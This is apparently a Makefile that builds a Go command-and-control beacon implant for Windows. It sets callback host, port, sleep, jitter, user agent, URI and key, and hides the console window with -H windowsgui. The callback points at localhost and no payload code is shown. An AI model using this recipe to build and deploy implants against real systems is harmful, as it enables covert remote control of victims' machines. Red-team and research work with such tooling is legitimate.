BINARY_NAME=default_name
SPAWN_PATH=./

sSLEEP=5
sJITTER=5
RHOST=127.0.0.1
RPORT=80
LISTENER_NAME=test
BEACON_NAME=test
USERAGENT=bingo
URI=index.php

cGOOS=windows
cGOARCH=amd64

KEY=key

gohttp: 
	set GOOS=${cGOOS} 
	set GOARCH=${cGOARCH} 
	

# GOOS=${cGOOS} GOARCH=${cGOARCH} (put this infront of go build)
	go build \
	-ldflags "-X 'main.sSLEEP=${sSLEEP}' -X 'main.BEACON_NAME=${BEACON_NAME}' -X 'main.KEY=${KEY}' -X 'main.sJITTER=${sJITTER}' -X 'main.RHOST=${RHOST}' -X 'main.LISTENER_NAME=${LISTENER_NAME}' -X 'main.USERAGENT=${USERAGENT}' -X 'main.URI=${URI}' -H windowsgui" \
	-o ${SPAWN_PATH}${BINARY_NAME}